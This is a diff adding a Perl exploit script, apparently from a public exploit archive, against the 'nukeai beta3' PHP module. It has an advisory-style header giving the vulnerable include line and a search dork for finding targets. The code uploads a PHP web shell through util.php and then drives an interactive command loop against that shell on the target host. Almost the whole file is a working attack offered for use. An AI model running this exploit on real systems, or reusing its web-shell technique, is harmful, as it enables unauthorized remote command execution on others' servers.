@@ -1,0 +1,98 @@
+#!/usr/bin/perl
+#
++-------------------------------------------------------------------------------------------
+# + nukeai beta3 (util.php) Remote Code Execution Vulnerability
+#
++-------------------------------------------------------------------------------------------
+# + Affected Software .: nukeai beta3
+# + Download ..........: http://mesh.dl.sourceforge.net/sourceforge/nukeai/nukeai_beta3.zip
+# + Dork ..............: "nukeai beta3"
+# + Class .............: Remote Code Execution
+# + Risk ..............: High (Remote Code Execution)
+# + Found By ..........: DeltahackingTEAM Code :Dr.Trojan&Dr.Pantagon
+# + Exploit:http://[target]/[path]/modules/NukeAI/util.php?AIbasedir=http://
+# +-------------------------------------------------------------------------------------------
+# + Details:
+# + nukeai beta3 Download by default installation doesn't prevent any of the files in the
+# + modules/NukeAI directory from being accessed by a client. The modules/NukeAI
+# + file takes input passed to the script by util.php and writes it to $_POST["filename"].0
+# + unsanatized in the modules/NukeAI descriptions directory.
+# +
+# + Vulnerable Code:
+# +require_once $AIbasedir."/NukeAI/util.php";
+# +-------------------------------------------------------------------------------------------
+# Example: http://[site]/modules/NukeAI/util.php?AIbasedir=[php shell]
+
+use Getopt::Long;
+use URI::Escape;
+use IO::Socket;
+
+$code = "<?php passthru(\$_GET[cmd]); ?>";
+
+main();
+
+sub usage
+{
+    print "DeltahackingSecurityTEAM\n";
+    print "www.deltahacking.net\n";
+    print "Dr.Trojan,HIV++,D_7j,Lord,VPc,IMpostor,Dr.Pantagon\n";
+    print " http://advistory.deltahacking.net((we Bug))\n";
+    print "\nukeai beta3 Remote Code Execution Exploit\n";
+    print "-h, --host\ttarget host\t(example.com)\n";
+    print "-f, --file\tshell file\t(shell.php)\n";
+    print "-d, --dir\tinstall dir\t(/NukeAI)\n";
+    print "============================================================================farzad.sharifi\r\n";
+    exit;
+}
+
+sub main
+{
+    GetOptions ('h|host=s' => \$host,'f|file=s' => \$file,'d|dir=s' => \$dir);
+    usage() unless $host;
+
+    $dir = "/NukeAI" unless $dir;
+    $file = "shell.php" unless $file;
+    uri_escape($cmd);
+    $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80") or die "\nconnect() failed.\n";
+
+    print "\nconnected to ".$host.", sending data.\n";
+    $sendurl = "description=0&moreinfo=".$code."&accesses=0&filename=".$file."&date=&B1=Submit";
+    $sendlen = length($sendurl);
+    print $sock "POST ".$dir."NukeAI/util.php?AIbasedir= HTTP/1.1\n";
+    print $sock "Host: ".$host."\n";
+    print $sock "Connection: close\n";
+    print $sock "Content-Type: application/x-www-form-urlencoded\n";
+    print $sock "Content-Length: ".$sendlen."\n\n";
+    print $sock $sendurl;
+    print "attempted to create php shell, server response:\n\n";
+    while($recvd = <$sock>)
+    {
+        print " ".$recvd."";
+    }
+
+    while($cmd !~ "~quit")
+    {
+        print "\n\n-> ";
+        $cmd = <STDIN>;
+        if ($cmd !~ "~quit")
+        {
+          $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80")
+           or die "connect() failed.\n";
+          $sendurl = uri_escape($cmd);
+
+          print $sock "GET ".$dir."/descriptions/".$file.".0?cmd=".$sendurl." HTTP/1.1\n";
+          print $sock "Host: ".$host."\n";
+          print $sock "Accept: */*\n";
+          print $sock "Connection: close\n\n";
+          print "\n";
+
+          while($recvd = <$sock>)
+          {
+              print $recvd;
+          }
+        }
+    }
+    exit;
+}
+
+# milw0rm.com [2006-11-24]
